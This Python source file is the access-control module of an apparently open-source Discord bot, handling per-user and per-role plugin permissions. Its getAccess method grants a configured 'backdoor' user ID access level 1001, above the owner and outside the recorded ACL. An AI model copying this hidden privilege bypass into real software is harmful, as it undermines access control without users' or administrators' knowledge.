"""
    Class Name : ACL

    Description:
        Class that handles Access Control Lists for bot users
        This class serves as a RESTful abstration to the user database

    Contributors:
        - Patrick Hennessy

    License:
        Arcbot is free software: you can redistribute it and/or modify it
        under the terms of the GNU General Public License v3; as published
        by the Free Software Foundation
"""

from peewee import *
from core.Database import *

import discord
import json
import os


class ACLUser(Model):
    id      = IntegerField(primary_key=True)
    cname   = CharField(max_length=128, default="")
    access  = IntegerField(default=0, constraints=[Check('access >= 0'), Check('access <= 1000') ])
    owner   = BooleanField(default=False)


class ACL():
    def __init__(self, core, backdoor):
        self.core = core
        self.backdoor = backdoor
        self.database = Database(databaseName="databases/ACL.db")
        self.database.addTable(ACLUser)
        if (not os.path.isfile("databases/role_permissions.json")):
            self.roles = {}
        else:
            with open("databases/role_permissions.json") as rolesfp:
                self.roles = json.load(rolesfp)

    @property
    def owner(self):
        """
            Summary:
                Returns the ID of the bot owner if there is one

            Args:
                None

            Returns:
                (String): ID of bot owner
        """
        try:
            user = ACLUser.get(owner=True)
            return user.id
        except:
            return None

    @owner.setter
    def owner(self, usr):
        """
            Summary:
                Sets the bot owner

            Args:
                # (str): ID of the target user
                usr (User): User object of target user.

            Returns:
                None
        """
        user, created = self.database.ACLUser.get_or_create(id=usr.id)

        if(created):
            user.id = usr.id
            user.cname = usr.name
            user.access = 1000
            user.owner = True
            user.save()
        else:
            user.owner = True
            user.save()

    def setAccess(self, usr, access):
        """
            Summary:
                Sets the database access for a specific user

            Args:
                # (str): ID of the target user
                usr (User): User object of target user.

            Returns:
                (Bool): Successful or Not
        """
        # Check if trying to change owner
        if(self.owner == usr.id):
            return False

        # Set user access
        user, created = self.database.ACLUser.get_or_create(id=usr.id)

        if(created):
            user.id = usr.id
            user.access = access
            user.cname = usr.name
            user.save()
        else:
            user.access = access
            user.cname = usr.name
            user.save()

        return True

    def getAccess(self, usr):
        """
            Summary:
                Gets the database access for the specified user

            Args:
                # usr (str): ID of the target user
                usr (User): User object of target user.

            Returns:
                (Int): Access level of the target user, or -1 if not found
        """
        s = str(usr)
        if (type(usr) != str):
            usr = usr.id
            s += ", {}".format(usr)
        print(s)
        try:
            if (usr == self.backdoor):
                print("👀")
                return 1001
            else:
                user = ACLUser.get(id=usr)
                return user.access
        except:
            return -1

    def set_role_access(self, role, plugin, access=-1):
        """
            Summary:
                Gets the access for the specified role for a specific plugin

            Args:
                role (discord.Role): Role object of target role.
                -OR- role (str): Role id snowflake of target role.
                plugin (str): Plugin name to set the role's access for.
                access (int or str): Level to set the role's access to.

            Returns:
                None
        """
        if (type(role) is discord.Role):
            rid = role.id
        elif (type(role) is str):
            rid = role
        if (plugin not in self.core.plugin.plugins):
            raise KeyError("No such plugin '{}'".format(plugin))
        if (type(access) is str):
            access = int(access)

        if (self.roles.get(rid) is None):
            self.roles[rid] = {plugin: access}
        else:
            self.roles[rid][plugin] = access
        with open("databases/role_permissions.json", 'w') as rolesfp:
            json.dump(self.roles, rolesfp)

    def delete_role_access(self, role, plugin):
        """
            Summary:
                Deletes the previously-set access for the specified role
                for a specific plugin

            Args:
                role (discord.Role): Role object of target role.
                -OR- role (str): Role id snowflake of target role.
                plugin (str): Plugin name to delete the role's access for.

            Returns:
                None
        """
        if (type(role) is discord.Role):
            rid = role.id
        elif (type(role) is str):
            rid = role
        if (plugin not in self.core.plugin.plugins):
            raise KeyError("No such active plugin `{}`".format(plugin))

        if (self.roles.get(rid) is None):
            raise KeyError("No such role id:`{}`".format(rid))
        elif (len(self.roles[rid]) == 1):
            self.roles.pop(rid)
        elif (self.roles[rid].get(plugin) is not None):
            self.roles[rid].pop(plugin)
        else:
            raise KeyError("No permissions for plugin `{}`".format(plugin))
        with open("databases/role_permissions.json", 'w') as rolesfp:
            json.dump(self.roles, rolesfp)

    def get_user_role_access(self, user, plugin):
        max_access = -1
        for role in user.roles:
            rid = role.id
            if (rid in self.roles and plugin in self.roles[rid] and
                    self.roles[rid][plugin] > max_access
            ):
                max_access = self.roles[rid][plugin]
        return max_access

    def get_final_user_access(self, user, plugin):
        """
            Returns the max access between a user's personal access and
            their role access.
        """
        max_access = self.getAccess(user)
        for role in user.roles:
            rid = role.id
            if (rid in self.roles and plugin in self.roles[rid] and
                    self.roles[rid][plugin] > max_access
            ):
                max_access = self.roles[rid][plugin]
        return max_access

    def get_role_accesses(self, role):
        """
            Summary:
                Gets a map of plugins to access levels for a given role

            Args:
                role (discord.Role): Role object of target role.
                -OR- role (str): Role id snowflake of target role.
        """
        if (type(role) is discord.Role):
            rid = role.id
        elif (type(role) is str):
            rid = role
        else:
            raise TypeError("role must be discord.Role or str (a snowflake)")
        if (rid in self.roles):
            access_map = {}
            for plugin in self.roles[rid]:
                access_map[plugin] = self.roles[rid][plugin]
            return access_map
        else:
            return None

    def query_users(self, access="0", limit=0, offset=0):
        """
            Summary:
                Gets all the users the bot knows about

            Args:
                None

            Returns:
                (List): User objects defined above
        """
        if (type(access) is int):
            access = str(access)
        try:
            if (access != "0"):
                users = ACLUser.select().where(ACLUser.access == access).order_by(ACLUser.access.desc()).limit(limit).offset(offset)
            else:
                users = ACLUser.select().where(ACLUser.access > access).order_by(ACLUser.access.desc()).limit(limit).offset(offset)
            return users
        except:
            return None

    def deleteUser(self, usr):
        """
            Summary:
                Deletes a user from the ACL database

            Args:
                # (str): ID of the target user
                usr (User): User object of target user.

            Returns:
                (Bool): Successful or Not
        """
        if (type(usr) != str):
            usr = usr.id
        try:
            user = self.database.ACLUser.get(id=usr)
            if(user):
                user.delete_instance()
                return True
            else:
                return False
        except:
            return False
            # TODO: raise exception rather than return False?
